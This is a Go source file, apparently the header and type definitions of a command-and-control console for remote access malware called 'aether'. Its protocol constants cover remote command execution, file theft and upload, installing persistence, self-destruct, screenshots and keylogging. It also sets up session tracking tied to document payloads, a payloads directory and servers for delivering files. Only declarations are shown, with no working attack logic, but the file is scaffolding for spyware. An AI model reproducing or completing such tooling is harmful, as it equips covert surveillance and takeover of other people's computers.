package main

import (
	"net"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/chzyer/readline"
)

// ── Message type constants ────────────────────────────────────────────────────

const (
	MsgExecCmd            uint16 = 0x1001
	MsgExecReply          uint16 = 0x1002
	MsgFileDownloadReq    uint16 = 0x2001
	MsgFileDataStream     uint16 = 0x2002
	MsgFileEOF            uint16 = 0x2003
	MsgFileUploadReq      uint16 = 0x2004
	MsgFileUploadData     uint16 = 0x2005
	MsgFileDelete         uint16 = 0x2006
	MsgFileDeleteReply    uint16 = 0x2007
	MsgFileList           uint16 = 0x2008
	MsgFileListReply      uint16 = 0x2009
	MsgChangeDir          uint16 = 0x200A
	MsgChangeDirReply     uint16 = 0x200B
	MsgGetCwd             uint16 = 0x200C
	MsgGetCwdReply        uint16 = 0x200D
	MsgErrorAlert         uint16 = 0x9001
	MsgInstallPersistence uint16 = 0x3001
	MsgRemovePersistence  uint16 = 0x3002
	MsgPersistenceStatus  uint16 = 0x3003
	MsgSelfDestruct       uint16 = 0x4001
	MsgSelfDestructReply  uint16 = 0x4002
	MsgAuthToken          uint16 = 0x0001
	MsgAuthSuccess        uint16 = 0x0002
	MsgAuthFail           uint16 = 0x0003
	MsgSysInfo            uint16 = 0x5001
	MsgSysInfoReply       uint16 = 0x5002
	MsgScreenshot         uint16 = 0x6001
	MsgKeylogStart        uint16 = 0x7001
	MsgKeylogStop         uint16 = 0x7002
	MsgKeylogDump         uint16 = 0x7003
	MsgKeylogData         uint16 = 0x7004
	MsgRecord             uint16 = 0x8001
	MsgSearch             uint16 = 0xB001
	MsgSearchReply        uint16 = 0xB002
	MsgZip                uint16 = 0xC001
)

// ── ANSI colours ──────────────────────────────────────────────────────────────

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorCyan   = "\033[36m"
	ColorPurple = "\033[35m"
)

const RECONNECT_DELAY = 5

// ── Data types ────────────────────────────────────────────────────────────────

type Session struct {
	ID               string    `json:"id"`
	Name             string    `json:"name"`
	IP               string    `json:"ip"`
	Port             string    `json:"port"`
	Token            string    `json:"token"`
	CreatedAt        time.Time `json:"created_at"`
	LastUsed         time.Time `json:"last_used"`
	LastSeen         time.Time `json:"last_seen"`
	Description      string    `json:"description"`
	Persistent       bool      `json:"persistent"`
	DocxPath         string    `json:"docx_path"`
	Destroyed        bool      `json:"destroyed"`
	Connected        bool      `json:"connected"`
	ManualDisconnect bool      `json:"manual_disconnect"`
	DownloadPath     string    `json:"download_path"`
}

type SessionStore struct {
	Sessions        map[string]*Session `json:"sessions"`
	ActiveSessionID string              `json:"active_session_id"`
}

type TransferStats struct {
	TotalBytes       int64
	TransferredBytes int64
	StartTime        time.Time
	Filename         string
	RemotePath       string
}

type DownloadJob struct {
	RemotePath string
	LocalPath  string
	Session    *Session
}

type FileServerState struct {
	Server   *http.Server
	Running  bool
	Mutex    sync.Mutex
	Port     string
	PublicIP string
}

type TemplateServerState struct {
	Server   *http.Server
	Template []byte
	Filename string
	Running  bool
	Mutex    sync.Mutex
}

// ── Global state ──────────────────────────────────────────────────────────────

var (
	activeConn          net.Conn
	pendingFile         string
	pendingDownloadMode string
	pendingRemoteDir    string
	pendingDirStack     []string
	pendingRemoteFiles  []string
	pendingLocalBase    string
	currentSession      *Session
	sessionStore        *SessionStore
	sessionFile         = "aether_sessions.json"
	uploadStats         = make(map[string]*TransferStats)
	downloadStats       = make(map[string]*TransferStats)
	rl                  *readline.Instance
	activeListener      net.Listener
	downloadQueue       = make(chan DownloadJob, 100)
	downloadWg          sync.WaitGroup
	stopDownloaders     = make(chan bool)
	payloadsDir         = "payloads"
	shellMode           bool

	fileServer     = &FileServerState{Port: "8081"}
	templateServer = &TemplateServerState{}
)

func init() {
	go downloadWorker()
	os.MkdirAll(payloadsDir, 0755)
}
